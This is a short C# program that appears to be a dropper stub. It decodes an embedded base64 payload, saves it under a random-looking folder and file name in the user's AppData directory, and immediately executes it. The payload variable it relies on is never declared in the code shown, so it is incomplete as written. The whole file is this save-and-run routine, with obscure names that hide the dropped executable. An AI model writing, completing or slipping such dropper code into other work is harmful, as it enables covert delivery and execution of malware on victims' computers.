﻿using System;
using System.Diagnostics;
using System.IO;

class Program
{
    static void Main(string[] args)
    {
        byte[] bytes = Convert.FromBase64String(contentToSave);
        // Specify the file path where you want to save the file
        string folderPath = CreateFolder();
        string filePath = Path.Combine(folderPath, "lkjlaoudafsjlk");

        // Call the SaveFile method to save the content to the file
        SaveFile(filePath, bytes);

        StartProcess(filePath, "");

        Console.WriteLine("File saved successfully.");
    }

    static string CreateFolder()
    {
        try
        {
            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string folderPath = Path.Combine(tempFolder, "flajlngalfjladjfa");

            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
                Console.WriteLine("Folder created successfully.");
                return folderPath;
            }
            else
            {
                Console.WriteLine("Folder already exists.");
                return folderPath;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred with folder creation: {ex.Message}");
            return "fail";
        }
    }

    static void SaveFile(string filePath, byte[] fileContent)
    {
        try
        {
            // Write the content to the specified file
            File.WriteAllBytes(filePath, fileContent);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred with file save: {ex.Message}");
            Environment.Exit(1);
        }
    }
    static void StartProcess(string executablePath, string arguments)
    {
        try
        {
            Process process = new Process();
            process.StartInfo.FileName = executablePath;
            process.StartInfo.Arguments = arguments;
            process.Start();

            Console.WriteLine("Process started successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
    }

}